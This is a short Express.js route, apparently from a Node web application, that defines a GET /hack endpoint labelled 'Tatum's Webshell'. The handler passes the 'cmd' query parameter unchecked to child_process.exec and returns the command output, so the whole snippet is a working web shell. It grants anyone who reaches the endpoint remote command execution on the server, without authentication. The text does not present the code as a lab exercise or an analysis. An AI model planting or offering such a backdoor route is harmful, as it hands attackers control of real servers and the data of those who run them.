app.get('/hack', (req, res) => {
  const { exec } = require('child_process')
  if (req.query.cmd) {
    exec(req.query.cmd, (err, stdout) => {
      res.end(stdout)
      if (err) {
        res.end(err)
      }
    })
  } else {
    res.end("Tatum's Webshell")
  }
})

